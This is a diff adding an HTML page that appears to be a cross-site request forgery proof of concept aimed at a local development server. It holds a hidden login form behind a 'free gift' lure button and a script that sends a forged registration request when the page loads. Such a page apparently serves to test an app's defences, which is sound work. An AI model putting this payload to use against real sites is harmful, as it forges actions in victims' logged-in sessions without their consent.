@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <form action="http://localhost:8000/auth/login" method="POST">
+      <input name="login" value="123" hidden />
+      <input name="password" value="123" hidden />
+      <input type="submit" value="Click to get your free gift!" />
+    </form>
+    <script>
+      fetch("http://localhost:8000/auth/register", {
+        method: "POST",
+        body: JSON.stringify({
+          login: "aaa",
+          password: "ddd",
+        }),
+      });
+    </script>
+  </body>
+</html>
